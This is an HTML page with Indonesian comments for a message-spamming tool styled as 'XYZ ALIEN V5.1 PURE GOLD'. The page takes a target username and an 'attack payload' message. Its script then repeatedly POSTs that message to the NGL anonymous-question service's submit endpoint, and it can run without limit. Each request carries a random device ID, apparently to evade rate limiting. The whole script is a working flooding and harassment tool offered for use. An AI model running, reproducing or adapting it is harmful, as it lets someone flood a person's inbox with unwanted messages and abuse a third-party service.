<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XYZ ALIEN V5.1 - PURE GOLD</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700;900&family=Share+Tech+Mono&display=swap');
        
        :root { 
            --gold: #ffd700;
            --gold-glow: 0 0 15px rgba(255, 215, 0, 0.5);
            --gold-dim: #b8860b;
            --dark: #000000;
        }

        * { box-sizing: border-box; }
        body { 
            background: var(--dark); 
            color: var(--gold); /* Teks dasar jadi emas */
            font-family: 'Share Tech Mono', monospace; 
            margin: 0; 
            overflow-x: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        /* RAINBOW TEXT ANIMATION (HANYA UNTUK XYZ ALIEN) */
        @keyframes rainbow-text {
            0% { color: #ff0000; text-shadow: 0 0 10px #ff0000; }
            20% { color: #ffff00; text-shadow: 0 0 10px #ffff00; }
            40% { color: #00ff00; text-shadow: 0 0 10px #00ff00; }
            60% { color: #00ffff; text-shadow: 0 0 10px #00ffff; }
            80% { color: #0000ff; text-shadow: 0 0 10px #0000ff; }
            100% { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; }
        }

        /* MAIN CARD - FULL GOLD BORDER */
        .v5-card { 
            width: 100%;
            max-width: 450px;
            background: rgba(5, 5, 5, 0.95);
            border: 2px solid var(--gold); /* Border permanen emas */
            padding: 30px;
            box-shadow: var(--gold-glow); /* Efek glow emas */
            margin: 20px;
            border-radius: 2px;
        }

        h2.rainbow-title {
            font-family: 'Orbitron';
            text-align: center;
            font-size: 32px;
            margin-bottom: 5px;
            animation: rainbow-text 4s linear infinite; /* Hanya ini yang rainbow */
            letter-spacing: 4px;
            font-weight: 900;
        }

        .version {
            text-align: center;
            font-size: 10px;
            color: #555; /* Versi agak redup */
            margin-bottom: 25px;
            display: block;
            text-transform: uppercase;
        }

        /* INPUTS - FULL GOLD */
        input, textarea { 
            width: 100%; 
            background: transparent; 
            border: none; 
            border-bottom: 1px solid #333; /* Garis bawah awal redup */
            color: var(--gold); /* Teks input emas */
            padding: 12px 5px; 
            margin: 10px 0; 
            outline: none; 
            font-family: inherit;
        }
        input:focus { 
            border-bottom: 1px solid var(--gold); /* Garis bawah nyala emas */
            box-shadow: 0 5px 10px -5px rgba(255, 215, 0, 0.2);
        }
        ::placeholder { color: #444; } /* Placeholder redup */

        /* BUTTONS - PURE GOLD */
        button { 
            width: 100%; 
            padding: 15px; 
            background: transparent; 
            color: var(--gold); 
            border: 2px solid var(--gold); 
            font-family: 'Orbitron'; 
            cursor: pointer; 
            margin-top: 15px;
            transition: 0.3s;
            text-transform: uppercase;
            font-weight: bold;
            letter-spacing: 1px;
            box-shadow: 0 0 10px rgba(255, 215, 0, 0.1);
        }
        button:hover { 
            background: var(--gold); 
            color: #000; 
            box-shadow: var(--gold-glow); 
        }

        /* TERMINAL PURE GOLD */
        .terminal-gold { 
            background: #000; 
            height: 200px; 
            border: 1px solid #1a1a1a; 
            padding: 12px; 
            font-size: 11px; 
            color: var(--gold-dim); /* Log lama emas redup */
            overflow-y: auto; 
            margin-top: 20px;
            border-left: 3px solid var(--gold); /* Garis kiri emas nyala */
        }
        .gold-log-new { 
            color: var(--gold); /* Log baru emas nyala */
            text-shadow: 0 0 5px rgba(255, 215, 0, 0.4); 
        }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="v5-card">
        <h2 class="rainbow-title">XYZ ALIEN</h2>
        <span class="version">V5.1 PURE GOLD EDITION</span>

        <input type="text" id="target" placeholder="TARGET USN">
        <textarea id="msg" rows="3" placeholder="ATTACK PAYLOAD"></textarea>
        
        <input type="number" id="delay" placeholder="DELAY (ms)">
        <input type="text" id="count" placeholder="COUNT (00=∞)">

        <button id="fire-btn" onclick="startStrike()">EXECUTE GOLD STRIKE 🩸</button>
        <button id="stop-btn" class="hidden" onclick="stopStrike()" style="border-color:#300; color:#300;">ABORT MISSION</button>
        
        <div class="terminal-gold" id="term">
            <div class="gold-log-new">> SYSTEM STANDBY...</div>
        </div>
    </div>

<script>
    let active = false;

    function log(m) {
        const t = document.getElementById('term');
        // Log baru warna emas nyala, log lama redup
        t.innerHTML = `<div class="gold-log-new">> ${m}</div>` + t.innerHTML;
    }

    function stopStrike() { 
        active = false; 
    }

    async function startStrike() {
        const target = document.getElementById('target').value;
        const msg = document.getElementById('msg').value;
        const d = parseInt(document.getElementById('delay').value) || 500;
        const cRaw = document.getElementById('count').value;

        if(!target || !msg) return alert("REQUIRED: TARGET & PAYLOAD");

        active = true;
        document.getElementById('fire-btn').classList.add('hidden');
        document.getElementById('stop-btn').classList.remove('hidden');

        let isInf = (cRaw === "00");
        let limit = isInf ? Infinity : parseInt(cRaw);
        let sent = 0;

        log(`INITIATING GOLD SEQUENCE: ${target}`);

        while(active && sent < limit) {
            try {
                fetch(`https://ngl.link/api/submit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({username: target, question: msg, deviceId: 'gold-'+Math.random()})
                });
                sent++;
                if(sent % 5 === 0 || !isInf) log(`GOLD_STRIKE: ${sent}${isInf?'/∞':''}`);
            } catch(e) {}
            await new Promise(r => setTimeout(r, d));
        }

        active = false;
        document.getElementById('fire-btn').classList.remove('hidden');
        document.getElementById('stop-btn').classList.add('hidden');
        log("GOLD SEQUENCE COMPLETED.");
    }
</script>

</body>
</html>
